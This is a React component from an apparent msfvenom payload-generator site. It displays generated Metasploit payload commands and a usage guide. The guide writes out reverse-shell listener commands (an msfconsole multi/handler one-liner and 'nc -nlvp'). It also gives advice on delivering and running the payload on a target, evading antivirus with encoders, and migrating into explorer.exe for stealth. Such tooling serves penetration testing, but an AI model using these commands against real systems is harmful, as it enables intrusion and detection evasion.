"use client";

import { Callout } from "@/components/ui/Callout";
import { CommandBlock, InlineCommandRow } from "@/components/ui/CommandBlock";
import { CopyButton } from "@/components/ui/CopyButton";
import { MsfvenomSelection, resolvePayloadId } from "@/lib/msfvenom/generate";

export function GeneratedOutputPanel({
  generatedSelection,
  generatedCommand,
  generatedBashVariable,
  generatedListenerParams,
  generatedRisk,
  guideLhost,
  guideLport,
}: {
  generatedSelection: MsfvenomSelection;
  generatedCommand: string;
  generatedBashVariable: string | null;
  generatedListenerParams: string | null;
  generatedRisk: boolean;
  guideLhost: string;
  guideLport: number;
}) {
  return (
    <div className="flex flex-col gap-4">
      <CommandBlock
        label="Command"
        command={generatedCommand}
        actions={
          <>
            <CopyButton text={generatedCommand} label="Copy Command" />
            {generatedBashVariable && <CopyButton text={generatedBashVariable} label="Copy as Bash Variable" />}
            {generatedListenerParams && <CopyButton text={generatedListenerParams} label="Copy LHOST/LPORT" />}
          </>
        }
      >
        <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">
          {resolvePayloadId(generatedSelection.payload, generatedSelection.arch)} · {generatedSelection.format.label} ·{" "}
          {generatedSelection.encoder.label}
        </p>
        {generatedRisk && (
          <div className="mt-2">
            <Callout variant="warning">
              This payload has no encoding. Antivirus may detect it immediately; consider regenerating with an encoder.
            </Callout>
          </div>
        )}
      </CommandBlock>

      <details className="rounded border border-zinc-200 dark:border-zinc-800" open>
        <summary className="cursor-pointer px-3 py-2 text-sm font-medium">Usage Guide</summary>
        <div className="flex flex-col gap-3 px-3 pb-3 text-sm text-zinc-600 dark:text-zinc-400">
          <p>Once you have your payload, catch it with a matching listener:</p>
          <InlineCommandRow
            label="Multi/handler (works for all Metasploit payloads)"
            command={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
          />
          <InlineCommandRow label="Raw listener (plain, non-Meterpreter shell payloads only)" command={`nc -nlvp ${guideLport}`} />
          <p>
            Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
            reachable from the target (not 127.0.0.1), and firewall rules on both ends.
          </p>
          <p>
            Once you have a session, Meterpreter&apos;s <code>migrate &lt;PID&gt;</code> command can move execution into another process (e.g.
            explorer.exe) for stealth. This is a post-exploitation msfconsole command, not something msfvenom generates.
          </p>
        </div>
      </details>
    </div>
  );
}
